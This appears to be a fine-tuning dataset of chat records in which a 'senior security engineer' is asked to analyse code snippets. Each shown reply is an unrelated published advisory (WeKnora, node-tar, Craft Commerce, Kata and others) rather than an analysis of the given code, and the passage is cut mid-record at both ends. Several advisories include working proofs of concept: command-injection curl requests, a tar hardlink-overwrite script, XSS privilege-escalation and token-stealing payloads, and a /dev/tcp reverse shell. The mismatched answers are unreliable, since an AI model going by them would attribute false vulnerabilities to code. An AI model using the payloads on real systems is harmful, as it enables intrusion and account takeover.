/api/v1/mcp-services)\n****https://github.com/Tencent/WeKnora/blob/6b7558c5592828380939af18240a4cef67a2cbfc/internal/handler/mcp_service.go#L40-L55\n    \n    ```go\n    \tvar service types.MCPService\n    \tif err := c.ShouldBindJSON(&service); err != nil {\n    \t\tlogger.Error(ctx, \"Failed to parse MCP service request\", err)\n    \t\tc.Error(errors.NewBadRequestError(err.Error()))\n    \t\treturn\n    \t}\n    \n    \ttenantID := c.GetUint64(types.TenantIDContextKey.String())\n    \tif tenantID == 0 {\n    \t\tlogger.Error(ctx, \"Tenant ID is empty\")\n    \t\tc.Error(errors.NewBadRequestError(\"Tenant ID cannot be empty\"))\n    \t\treturn\n    \t}\n    \tservice.TenantID = tenantID\n    \n    \tif err := h.mcpServiceService.CreateMCPService(ctx, &service); err != nil {\n    ```\n    \n3. **Taint propagation (storage)**: The bound service object is stored directly in the database without sanitization.\n****https://github.com/Tencent/WeKnora/blob/6b7558c5592828380939af18240a4cef67a2cbfc/internal/application/repository/mcp_service.go#L23-L25\n    \n    ```go\n    func (r *mcpServiceRepository) Create(ctx context.Context, service *types.MCPService) error {\n    \treturn r.db.WithContext(ctx).Create(service).Error\n    }\n    ```\n    \n4. **Sink execution**: /test endpoint loads the service from the database → executes TestMCPService\n    \n    https://github.com/Tencent/WeKnora/blob/6b7558c5592828380939af18240a4cef67a2cbfc/internal/handler/mcp_service.go#L323-L325\n    https://github.com/Tencent/WeKnora/blob/6b7558c5592828380939af18240a4cef67a2cbfc/internal/application/service/mcp_service.go#L238-L264\n    \n    ```go\n    \tlogger.Infof(ctx, \"Testing MCP service: %s\", secutils.SanitizeForLog(serviceID))\n    \n    \tresult, err := h.mcpServiceService.TestMCPService(ctx, tenantID, serviceID)\n    ```\n    \n    ```go\n    \tservice, err := s.mcpServiceRepo.GetByID(ctx, tenantID, id)\n    \tif err != nil {\n    \t\treturn nil, fmt.Errorf(\"failed to get MCP service: %w\", err)\n    \t}\n    \tif service == nil {\n    \t\treturn nil, fmt.Errorf(\"MCP service not found\")\n    \t}\n    \n    \t// Create temporary client for testing\n    \tconfig := &mcp.ClientConfig{\n    \t\tService: service,\n    \t}\n    \n    \tclient, err := mcp.NewMCPClient(config)\n    \tif err != nil {\n    \t\treturn &types.MCPTestResult{\n    \t\t\tSuccess: false,\n    \t\t\tMessage: fmt.Sprintf(\"Failed to create client: %v\", err),\n    \t\t}, nil\n    \t}\n    \n    \t// Connect\n    \ttestCtx, cancel := context.WithTimeout(ctx, 30*time.Second)\n    \tdefer cancel()\n    \n    \tif err := client.Connect(testCtx); err != nil {\n    \t\treturn &types.MCPTestResult{\n    ```\n    \n5. **Ultimate sink (subprocess execution)**: The command/args values from stdio configuration are directly used in the subprocess execution path.\n****https://github.com/Tencent/WeKnora/blob/6b7558c5592828380939af18240a4cef67a2cbfc/internal/mcp/client.go#L120-L137\nhttps://github.com/Tencent/WeKnora/blob/6b7558c5592828380939af18240a4cef67a2cbfc/internal/mcp/client.go#L158-L160\n    \n    ```go\n    \tcase types.MCPTransportStdio:\n    \t\tif config.Service.StdioConfig == nil {\n    \t\t\treturn nil, fmt.Errorf(\"stdio_config is required for stdio transport\")\n    \t\t}\n    \n    \t\t// Convert env vars map to []string format (KEY=value)\n    \t\tenvVars := make([]string, 0, len(config.Service.EnvVars))\n    \t\tfor key, value := range config.Service.EnvVars {\n    \t\t\tenvVars = append(envVars, fmt.Sprintf(\"%s=%s\", key, value))\n    \t\t}\n    \n    \t\t// Create stdio client with options\n    \t\t// NewStdioMCPClientWithOptions(command string, env []string, args []string, opts ...transport.StdioOption)\n    \t\tmcpClient, err = client.NewStdioMCPClientWithOptions(\n    \t\t\tconfig.Service.StdioConfig.Command,\n    \t\t\tenvVars,\n    \t\t\tconfig.Service.StdioConfig.Args,\n    \t\t)\n    ```\n    \n    ```go\n    \tif err := c.client.Start(ctx); err != nil {\n    \t\treturn fmt.Errorf(\"failed to start client: %w\", err)\n    \t}\n    ```\n    \n\n### PoC\n\n---\n\n**PoC Description**\n \n- Obtain an authentication token.\n- Create an MCP service with transport_type=stdio, injecting the command to execute into stdio_config.command/args.\n- Call the /test endpoint to trigger the Connect() → Start() execution flow, confirming command execution on the server via side effects (e.g., file creation).\n\n**PoC**\n \n- **Container state verification (pre-exploitation)**\n    \n    ```bash\n    docker exec -it WeKnora-app /bin/bash\n    cd /tmp/; ls -l\n    ```\n    \n    <img width=\"798\" height=\"78\" alt=\"image\" src=\"https://github.com/user-attachments/assets/3e387e39-cd80-4e30-ba23-3db9ff879209\" />\n    \n- **Authenticate via /api/v1/auth/login to obtain a Bearer token for API calls.**\n    \n    ```bash\n    API=\"http://localhost:8080\"\n    EMAIL=\"admin@gmail.com\"\n    PASS=\"admin123\"\n    \n    TOKEN=\"$(curl -sS -X POST \"$API/api/v1/auth/login\" \\\n      -H \"Content-Type: application/json\" \\\n      -d \"{\\\"email\\\":\\\"$EMAIL\\\",\\\"password\\\":\\\"$PASS\\\"}\" | jq -r '.token // empty')\"\n      \n    echo \"TOKEN=$TOKEN\"\n    ```\n    \n    <img width=\"760\" height=\"73\" alt=\"image\" src=\"https://github.com/user-attachments/assets/4e588f20-9371-4dc3-b585-def2cd752497\" />\n    \n    <img width=\"1679\" height=\"193\" alt=\"image\" src=\"https://github.com/user-attachments/assets/a372981c-dc4c-40e9-a9af-4d27fd36251a\" />\n    \n- **POST to /api/v1/mcp-services with transport_type=stdio and stdio_config to define the command and arguments to be executed on the server.**\n    \n    ```bash\n    CREATE_RES=\"$(curl -sS -X POST \"$API/api/v1/mcp-services\" \\\n      -H \"Authorization: Bearer $TOKEN\" \\\n      -H \"Content-Type: application/json\" \\\n      -d '{\n        \"name\":\"rce\",\n        \"description\":\"rce\",\n        \"enabled\":true,\n        \"transport_type\":\"stdio\",\n        \"stdio_config\":{\"command\":\"bash\",\"args\":[\"-lc\",\"id > /tmp/RCE_ok.txt && uname -a >> /tmp/RCE_ok.txt\"]},\n        \"env_vars\":{}\n      }')\"\n      \n    MCP_ID=\"$(echo \"$CREATE_RES\" | jq -r '.data.id // empty')\"\n    echo \"MCP_ID=$MCP_ID\"\n    ```\n    \n    <img width=\"1296\" height=\"354\" alt=\"image\" src=\"https://github.com/user-attachments/assets/d109dd4e-d051-46e3-bdcc-4d1a181d1635\" />\n    \n- **Invoke /api/v1/mcp-services/{id}/test to trigger Connect(), causing execution of the stdio subprocess.**\n    \n    ```bash\n    curl -sS -X POST \"$API/api/v1/mcp-services/$MCP_ID/test\" \\\n      -H \"Authorization: Bearer $TOKEN\" | jq .\n    ```\n    \n    <img width=\"1270\" height=\"217\" alt=\"image\" src=\"https://github.com/user-attachments/assets/2723ef39-f6b8-4478-b60e-5b6a4e667a1e\" />\n    \n- **Post-exploitation verification (container state)**\n    \n    ```bash\n    ls -l\n    ```\n    \n    <img width=\"1243\" height=\"221\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5f78f83a-64e2-4a0a-95c4-6832f606fbcd\" />\n    \n\n### Impact\n\n---\n\n- **Remote Code Execution (RCE)**: Arbitrary command execution enables file creation/modification, execution of additional payloads, and service disruption\n- **Information Disclosure**: Sensitive data exfiltration through reading environment variables, configuration files, keys, tokens, and local files\n- **Privilege Escalation/Lateral Movement (Environment-Dependent)**: Impact may escalate based on container mounts, network policies, and internal service access permissions\n- **Cross-Tenant Boundary Impact**: Execution occurs in a shared backend runtime; depending on deployment configuration, impact may extend beyond tenant boundaries (**exact scope is uncertain** and varies by deployment setup)"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nVirtualAuthenticator::VirtualAuthenticator(\n    ::device::FidoTransportProtocol transport)\n    : transport_(transport),\n      unique_id_(base::GenerateGUID()),\n      state_(base::MakeRefCounted<::device::VirtualFidoDevice::State>()) {}\n\n```"}, {"role": "assistant", "content": "node-tar is Vulnerable to Arbitrary File Overwrite and Symlink Poisoning via Insufficient Path Sanitization\n\n### Summary\n\nThe `node-tar` library (`<= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.\n\n### Details\n\nThe vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.\n\n**1. Hardlink Escape (Arbitrary File Overwrite)**\n\nThe extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.\n\nThe library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.\n\n**2. Symlink Poisoning**\n\nThe extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used.\n\n### PoC\n\nThe following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings and demonstrates the vulnerability by verifying that the local \"secret\" file was successfully overwritten.\n\n```javascript\nconst fs = require('fs')\nconst path = require('path')\nconst tar = require('tar')\n\nconst out = path.resolve('out_repro')\nconst secret = path.resolve('secret.txt')\nconst tarFile = path.resolve('exploit.tar')\nconst targetSym = '/etc/passwd'\n\n// Cleanup & Setup\ntry { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {}\nfs.mkdirSync(out)\nfs.writeFileSync(secret, 'ORIGINAL_DATA')\n\n// 1. Craft malicious Link header (Hardlink to absolute local file)\nconst h1 = new tar.Header({\n  path: 'exploit_hard',\n  type: 'Link',\n  size: 0,\n  linkpath: secret \n})\nh1.encode()\n\n// 2. Craft malicious Symlink header (Symlink to /etc/passwd)\nconst h2 = new tar.Header({\n  path: 'exploit_sym',\n  type: 'SymbolicLink',\n  size: 0,\n  linkpath: targetSym \n})\nh2.encode()\n\n// Write binary tar\nfs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ]))\n\nconsole.log('[*] Extracting malicious tarball...')\n\n// 3. Extract with default secure settings\ntar.x({\n  cwd: out,\n  file: tarFile,\n  preservePaths: false\n}).then(() => {\n  console.log('[*] Verifying payload...')\n\n  // Test Hardlink Overwrite\n  try {\n    fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN')\n    \n    if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') {\n      console.log('[+] VULN CONFIRMED: Hardlink overwrite successful')\n    } else {\n      console.log('[-] Hardlink failed')\n    }\n  } catch (e) {}\n\n  // Test Symlink Poisoning\n  try {\n    if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {\n      console.log('[+] VULN CONFIRMED: Symlink points to absolute path')\n    } else {\n      console.log('[-] Symlink failed')\n    }\n  } catch (e) {}\n})\n\n```\n\n### Impact\n\n* **Arbitrary File Overwrite:** An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files.\n* **Remote Code Execution (RCE):** In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all `Link` and `SymbolicLink` tar entries from extracted packages.)"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nint ssl3_pending(const SSL *s)\n{\n    unsigned int i;\n    int num = 0;\n\n    if (s->rlayer.rstate == SSL_ST_READ_BODY)\n        return 0;\n\n    for (i = 0; i < RECORD_LAYER_get_numrpipes(&s->rlayer); i++) {\n        if (SSL3_RECORD_get_type(&s->rlayer.rrec[i])\n            != SSL3_RT_APPLICATION_DATA)\n            return 0;\n        num += SSL3_RECORD_get_length(&s->rlayer.rrec[i]);\n    }\n\n    return num;\n}\n\n```"}, {"role": "assistant", "content": "Snowflake JDBC Driver is Vulnerable to Uncontrolled Resource Consumption through SdkProxyRoutePlanner\n\nA weakness has been identified in Snowflake JDBC Driver up to 4.0.1. Impacted is the function SdkProxyRoutePlanner of the file src/main/java/net/snowflake/client/internal/core/SdkProxyRoutePlanner.java of the component JDBC URL Handler. Executing a manipulation of the argument nonProxyHosts can lead to inefficient regular expression complexity. The attack can only be executed locally. The exploit has been made available to the public and could be used for attacks. This patch is called 5fb0a8a318a2ed87f4022a1f56e742424ba94052. A patch should be applied to remediate this issue."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstruct rxe_mem *lookup_mem(struct rxe_pd *pd, int access, u32 key,\n\t\t\t   enum lookup_type type)\n{\n\tstruct rxe_mem *mem;\n\tstruct rxe_dev *rxe = to_rdev(pd->ibpd.device);\n\tint index = key >> 8;\n\n\tif (index >= RXE_MIN_MR_INDEX && index <= RXE_MAX_MR_INDEX) {\n\t\tmem = rxe_pool_get_index(&rxe->mr_pool, index);\n\t\tif (!mem)\n\t\t\tgoto err1;\n\t} else {\n\t\tgoto err1;\n\t}\n\n\tif ((type == lookup_local && mem->lkey != key) ||\n\t    (type == lookup_remote && mem->rkey != key))\n\t\tgoto err2;\n\n\tif (mem->pd != pd)\n\t\tgoto err2;\n\n\tif (access && !(access & mem->access))\n\t\tgoto err2;\n\n\tif (mem->state != RXE_MEM_STATE_VALID)\n\t\tgoto err2;\n\n\treturn mem;\n\nerr2:\n\trxe_drop_ref(mem);\nerr1:\n\treturn NULL;\n}\n\n```"}, {"role": "assistant", "content": "node-forge is vulnerable to ASN.1 OID Integer Truncation\n\n### Summary\n\n**MITRE-Formatted CVE Description**\nAn Integer Overflow (CWE-190) vulnerability in node-forge versions 1.3.1 and below enables remote, unauthenticated attackers to craft ASN.1 structures containing OIDs with oversized arcs. These arcs may be decoded as smaller, trusted OIDs due to 32-bit bitwise truncation, enabling the bypass of downstream OID-based security decisions.\n\n### Description\n\nAn ASN.1 OID Integer Truncation vulnerability exists in the node-forge `asn1.derToOid` function within `forge/lib/asn1.js`. OID components are decoded using JavaScript's bitwise left-shift operator (`<<`), which forcibly casts values to 32-bit signed integers. Consequently, if an attacker provides a mathematically unique, very large OID arc integer exceeding $2^{31}-1$, the value silently overflows and wraps around rather than throwing an error. \n\n### Impact\n\nThis vulnerability allows a specially crafted ASN.1 object to spoof an OID, where a malicious certificate with a massive, invalid OID is misinterpreted by the library as a trusted, standard OID, potentially bypassing security controls.\n\nThis vulnerability impacts the `asn1.derToOid` function in `node-forge` before patched version `1.3.2`. \n\nAny downstream application using this component is impacted. This component may be leveraged by downstream applications in ways that enables partial compromise of integrity, leading to potential availability and confidentiality compromises."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nvoid MetricsWebContentsObserver::HandleCommittedNavigationForTrackedLoad(\n    content::NavigationHandle* navigation_handle,\n    std::unique_ptr<PageLoadTracker> tracker) {\n  if (!IsNavigationUserInitiated(navigation_handle) &&\n      (navigation_handle->GetPageTransition() &\n       ui::PAGE_TRANSITION_CLIENT_REDIRECT) != 0 &&\n      committed_load_) {\n    committed_load_->NotifyClientRedirectTo(*tracker);\n  }\n\n  committed_load_ = std::move(tracker);\n  committed_load_->Commit(navigation_handle);\n  DCHECK(committed_load_->did_commit());\n\n  for (auto& observer : testing_observers_)\n    observer.OnCommit(committed_load_.get());\n}\n\n```"}, {"role": "assistant", "content": "NiceGUI vulnerable to XSS via Code Injection during client-side element function execution\n\n### Summary\n\nSeveral NiceGUI APIs that execute methods on client-side elements (`Element.run_method()`, `AgGrid.run_grid_method()`, `EChart.run_chart_method()`, and others) use an `eval()` fallback in the JavaScript-side `runMethod()` function. When user-controlled input is passed as the method name, an attacker can inject arbitrary JavaScript that executes in the victim's browser.\n\nAdditionally, `Element.run_method()` and `Element.get_computed_prop()` used string interpolation instead of `json.dumps()` for the method/property name, allowing quote injection to break out of the intended string context.\n\n### Attack Vector\n\nAn attacker crafts a malicious URL with a payload as a query parameter. If the application passes this parameter as a method name to any of the affected APIs, the payload is sent to the client via WebSocket and executed via `eval()`.\n\n**Example:** `/?method=alert(document.cookie)` combined with application code like:\n```python\nelement.run_method(user_provided_method_name)\n```\n\n### Impact\n\n- Cookie/token theft\n- DOM manipulation (phishing, fake login forms)\n- Actions performed as the victim user\n\n### Affected Methods\n\n1. `Element.run_method()`\n2. `Element.get_computed_prop()`\n3. `AgGrid.run_grid_method()`\n4. `AgGrid.run_row_method()`\n5. `EChart.run_chart_method()`\n6. `JsonEditor.run_editor_method()`\n7. `Xterm.run_terminal_method()`\n8. `Leaflet.run_map_method()`\n9. `Leaflet.run_layer_method()`\n10. `LeafletLayer.run_method()`\n\n### Fix\n\n1. Use `json.dumps()` for proper escaping of method/property names in `run_method()` and `get_computed_prop()`\n2. Remove the `eval()` fallback from `runMethod()` in `nicegui.js` — method names that are not found on the element now raise an error instead of being evaluated as arbitrary JavaScript\n\n### Migration\n\nCode that previously passed JavaScript functions as method names needs to use `ui.run_javascript()` instead:\n\n```python\n# Before:\nrow = await grid.run_grid_method('g => g.getDisplayedRowAtIndex(0).data')\n\n# After:\nrow = await ui.run_javascript(f'return getElement({grid.id}).api.getDisplayedRowAtIndex(0).data')\n```"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nvoid PaintLayerScrollableArea::ResetRebuildScrollbarLayerFlags() {\n  rebuild_horizontal_scrollbar_layer_ = false;\n  rebuild_vertical_scrollbar_layer_ = false;\n}\n\n```"}, {"role": "assistant", "content": " Craft Commerce has Stored XSS in Inventory Location Address Leading to Potential Privilege Escalation\n\n## Summary\nA stored XSS vulnerability in Craft Commerce allows attackers to execute malicious JavaScript in an administrator’s browser. This occurs because the 'Address Line 1' field in Inventory Locations is not properly sanitized before being displayed in the admin panel.\n\n## Proof of Concept\n\n### Required Permissions\n- General permissions:\n\t- Access the control panel\n\t- Access Craft Commerce\n- Craft Commerce permissions:\n\t- Manage inventory locations\n- An active administrator elevated session\n\n<img width=\"887\" height=\"832\" alt=\"req-perms\" src=\"https://github.com/user-attachments/assets/7a9a5ef6-4fc3-4af1-8ded-08861ead0b7e\" />\n\n\n### Steps to Reproduce\n1. Log in to the Admin Panel with the attacker account with the permissions mentioned above.\n2. Navigate to **Commerce** -> **Inventory Locations** -> **Default** (`/admin/commerce/inventory-locations/1`).\n3. In the **Address Line 1** field, enter the following payload:\n```html\n<img src=x onerror=\"alert(document.domain)\">\n```\n4. Click **Save** and you'll be redirected back to the **Inventory Locations** page.\n5. Notice the alert proving JavaScript execution.\n<img width=\"1814\" height=\"606\" alt=\"alert-poc\" src=\"https://github.com/user-attachments/assets/f08aed21-a676-4dee-85a8-d195bab85685\" />\n\n\n\n### Privilege Escalation to Administrator:\n1. Do the same steps above, but replace the payload with a malicious one.\n2. The following payload elevates the attacker’s account to Admin if there’s already an elevated session, replace the `<UserID>` with the attacker id:\n```html\n<img src=x onerror=\"fetch('/admin/users/<UserID>/permissions',{method:'POST',body:`CRAFT_CSRF_TOKEN=${Craft.csrfTokenValue}&userId=<UserID>&admin=1&action=users/save-permissions`,headers:{'content-type':'application/x-www-form-urlencoded'}})\">\n```\n3. In another browser, log in as an admin & go to the vulnerable page (Inventory Location page).\n4. Go back to the attacker account & notice it now has admin status.\n\nThe privilege escalation requires an elevated session. In a real-world scenario, an attacker can automate the process by forcing a logout if the victim’s session is stale; upon re-authentication, the stored XSS payload executes within a fresh elevated session to complete the attack.\n\nOr even easier (and smarter), an attacker (using the XSS) can create a fake 'Session Expired' login modal overlay. Since it’s on the trusted domain, administrators will likely enter their credentials, sending them directly to the attacker.\n\n### Resources:\n\nhttps://github.com/craftcms/commerce/commit/fa273330807807d05b564d37c88654cd772839ee"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstatic String FullyDecodeString(const String& string,\n                                const WTF::TextEncoding& encoding) {\n  size_t old_working_string_length;\n  String working_string = string;\n  do {\n    old_working_string_length = working_string.length();\n    working_string = Decode16BitUnicodeEscapeSequences(\n        DecodeStandardURLEscapeSequences(working_string, encoding));\n  } while (working_string.length() < old_working_string_length);\n  working_string.Replace('+', ' ');\n  return working_string;\n}\n\n```"}, {"role": "assistant", "content": "Vikunja Vulnerable to XSS Via Task Preview\n\n### Summary\nThe task preview component creates a unparented div. The div's `innerHtml` is set to the unescaped description of the task\n\n### Details\nIn the `TaskGlanceTooltip.vue` it temporarily creates a div and sets the `innerHtml` to the description [here](https://github.com/go-vikunja/vikunja/blob/cdca79032526966cb248b72bddcf2a0f888c8a8f/frontend/src/components/tasks/partials/TaskGlanceTooltip.vue#L118). Since there is no escaping on either the server or client side, a malicious user can share a project, create a malicious task, and cause an XSS on hover.\n\n### PoC\n1. Create a project\n2. Create a task with any description\n3. Use the api to update the task with a description containing unescaped HTML (ex: `<img src=x onerror=\"alert(localStorage.getItem('token'))\">`\n4. Share the project with any permission level\n5. Send malicious project to user and ask them to view task\n\n### Impact\nAny user on an instance can cause an XSS on another"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nvoid napi_disable(struct napi_struct *n)\n{\n\tmight_sleep();\n\tset_bit(NAPI_STATE_DISABLE, &n->state);\n\n\twhile (test_and_set_bit(NAPI_STATE_SCHED, &n->state))\n\t\tmsleep(1);\n\twhile (test_and_set_bit(NAPI_STATE_NPSVC, &n->state))\n\t\tmsleep(1);\n\n\thrtimer_cancel(&n->timer);\n\n\tclear_bit(NAPI_STATE_DISABLE, &n->state);\n}\n\n```"}, {"role": "assistant", "content": "Moodle TeX formula editor is vulnerable to DoS through lack of execution time limits\n\nA Denial of Service vulnerability was identified in Moodle’s TeX formula editor. When rendering TeX content using mimetex, insufficient execution time limits could allow specially crafted formulas to consume excessive server resources. An authenticated user could abuse this behavior to degrade performance or cause service interruption."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nbool IsResumeBackgroundVideosEnabled() {\n  return base::FeatureList::IsEnabled(kResumeBackgroundVideo);\n}\n\n```"}, {"role": "assistant", "content": "Kata Container to Guest micro VM privilege escalation\n\n### Summary\n\nAn issue in Kata with Cloud Hypervisor allows a user of the container to modify the file system used by the Guest micro VM ultimately achieving arbitrary code execution as root in said VM. The current understinding is this doesn’t impact the security of the Host or of other containers / VMs running on that Host (note that arm64 QEMU lacks NVDIMM read-only support: It is believed that until the upstream QEMU gains this capability, a guest write could reach the image file).\n\n### Details\n\n_Linux virtio-pmem_\nThe `virtio-pmem` probe path always registers the region as a generic pagemap that supports asynchronous flushes, but it never marks the region as read-only.  Only the `ND_REGION_PAGEMAP` and `ND_REGION_ASYNC` bits are set before the region is created, so `nd_region->ro always` stays cleared and the block device is left writable.\n\nLater, `pmem_attach_disk()` wires the region into the block layer with full read/write semantics – the block device operations call `pmem_do_write()` which performs cache-flushed memcpy operations directly into the host-provided shared memory window. `nvdimm_check_and_set_ro()` would set the disk read-only if the region had been flagged as such, but because `virtio_pmem` never sets that flag, the helper becomes a no-op.\n\n_Cloud-Hypervisor virtio_pmem_\n`discard_writes=on` causes the file backing the `virtio-pmem` device to be opened read-only and mapped with `MAP_PRIVATE` rather than `MAP_SHARED`. That combination means the guest can modify the private copy of the mapped pages, but those modifications never propagate back to the underlying file. The guest (and Cloud Hypervisor process) will still read the modified data because it lives in the private copy of the mapping, so write-then-read sequences appear to succeed even though nothing is persisted. Once the mapping is dropped or the VM is restarted, those copy-on-write changes disappear, leaving the backing file unchanged.\n\n_Kata /dev/pmem0_\nKata boots each pod/VM by DAX-mapping a read-only guest image from the host into the VM and telling the guest kernel to mount the resulting `/dev/pmem*` device as its root filesystem.\nSince DAX maps the backing file directly into guest memory, there is no way for the hypervisor to intercept or reject individual stores, so a container with sufficient permissions can open `/dev/pmem0` and observe its own writes until the VM is rebooted or the cache is dropped.\n\n### PoC\n\nWhen putting all this together, this means that a user of a Container (not necessarily privileged, we don’t need `CAP_SYS_ADMIN`, but we need `CAP_MKNOD`) can modify the Guest OS filesystem, replacing libraries or binaries to achieve arbitrary code execution outside of the Container. This requires computing offsets of files within the device, which requires information like the partition start sector, sector size in bytes, the filesystem block size, and the physical block index of the file.\n\nTo achieve execution on the Guest, I replaced `/usr/bin/systemd-tmpfiles` with a connect-back shell to `localhost`: timers end up executing 15min after boot.\nI use `debugfs` to not require mounting privileges and work directly with the filesystem on `/dev/pmem0p1` to get the absolute offset of the file to modify in the device.\n\nIf you want a simpler PoC, just `dd` write something into `/dev/pmem0` and observe it's `dd` readable until discarded.\n\n```\nroot@ab5392da44ce:~# mknod /dev/pmem0 b 259 0\nroot@ab5392da44ce:~# mknod /dev/pmem0p1 b 259 1\nroot@ab5392da44ce:~# python pmem.py --file /usr/bin/systemd-tmpfiles --write --pattern 23212f62696e2f626173680a62617368202d69203e26202f6465762f7463702f3132372e302e302e312f34343320303e26310a6578697420300a\n=== Resolution ===\nPartition device:         /dev/pmem0p1 (pmem0p1)\nPartition start (sectors): 2048\nSector size (bytes):       512\nPartition start (bytes):   1048576\nFilesystem block size:     4096\nFile path:                 /usr/bin/systemd-tmpfiles\nFile offset (bytes):       0\nLogical block index:       0\nIntra-block offset:        0\nPhysical block index:      40668\n→ Absolute pmem offset:    167624704\n[*] Raw read (64 bytes at 167624704):\n09fdc000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00 |.ELF............|\n09fdc010  03 00 3e 00 01 00 00 00  20 66 00 00 00 00 00 00 |..>..... f......|\n09fdc020  40 00 00 00 00 00 00 00  48 82 01 00 00 00 00 00 |@.......H.......|\n09fdc030  00 00 00 00 40 00 38 00  0d 00 40 00 20 00 1f 00 |....@.8...@. ...|\n[+] Wrote 58 bytes at absolute offset 167624704. Verifying...\n09fdc000  23 21 2f 62 69 6e 2f 62  61 73 68 0a 62 61 73 68 |#!/bin/bash.bash|\n09fdc010  20 2d 69 20 3e 26 20 2f  64 65 76 2f 74 63 70 2f | -i >& /dev/tcp/|\n09fdc020  31 32 37 2e 30 2e 30 2e  31 2f 34 34 33 20 30 3e |127.0.0.1/443 0>|\n09fdc030  26 31 0a 65 78 69 74 20  30 0a                   |&1.exit 0.|\nroot@ab5392da44ce:~# nc -lvp 443\nNcat: Version 7.93 ( https://nmap.org/ncat )\nNcat: Listening on :::443\nNcat: Listening on 0.0.0.0:443\nNcat: Connection from 127.0.0.1.\nNcat: Connection from 127.0.0.1:44880.\nbash: cannot set terminal process group (329): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@localhost:/# \nroot@localhost:/# ps auxw\nps auxw\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.0  17280  1920 ?        Ss   16:16   0:01 /sbin/init\nroot           2  0.0  0.0      0     0 ?        S    16:16   0:00 [kthreadd]\nroot           3  0.0  0.0      0     0 ?        S    16:16   0:00 [pool_workqueue_release]\nroot           4  0.0  0.0      0     0 ?        I<   16:16   0:00 [kworker/R-rcu_gp]\nroot           5  0.0  0.0      0     0 ?        I<   16:16   0:00 [kworker/R-sync_wq]\nroot           6  0.0  0.0      0     0 ?        I<   16:16   0:00 [kworker/R-slub_flushwq]\nroot           7  0.0  0.0      0     0 ?        I<   16:16   0:00 [kworker/R-netns]\nroot           9  0.0  0.0      0     0 ?        I<   16:16   0:00 [kworker/0:0H-events_highpri]\nroot          10  0.0  0.0      0     0 ?        I    16:16   0:01 [kworker/0:1-events_power_efficient]\nroot          12  0.0  0.0      0     0 ?        I<   16:16   0:00 [kworker/R-mm_percpu_wq]\nroot          13  0.0  0.0      0     0 ?        I    16:16   0:00 [rcu_tasks_trace_kthread]\nroot          14  0.0  0.0      0     0 ?        S    16:16   0:00 [ksoftirqd/0]\nroot          15  0.0  0.0      0     0 ?        I    16:16   0:00 [rcu_sched]\nroot          16  0.0  0.0      0     0 ?        S    16:16   0:00 [rcu_exp_par_gp_kthread_worker/1]\nroot          17  0.0  0.0      0     0 ?        S    16:16   0:00 [rcu_exp_gp_kthread_worker]\nroot          18  0.0  0.0      0     0 ?        S    16:16   0:00 [migration/0]\nroot          19  0.0  0.0      0     0 ?        S    16:16   0:00 [cpuhp/0]\nroot          20  0.0  0.0      0     0 ?        S    16:16   0:00 [kdevtmpfs]\nroot          21  0.0  0.0      0     0 ?        I<   16:16   0:00 [kworker/R-inet_frag_wq]\nroot          22  0.0  0.0      0     0 ?        S    16:16   0:00 [kauditd]\nroot          23  0.0  0.0      0     0 ?        S    16:16   0:00 [oom_reaper]\nroot          24  0.0  0.0      0     0 ?        I<   16:16   0:00 [kworker/R-writeback]\nroot          25  0.0  0.0      0     0 ?        S    16:16   0:00 [kcompactd0]\nroot          26  0.0  0.0      0     0 ?        I<   16:16   0:00 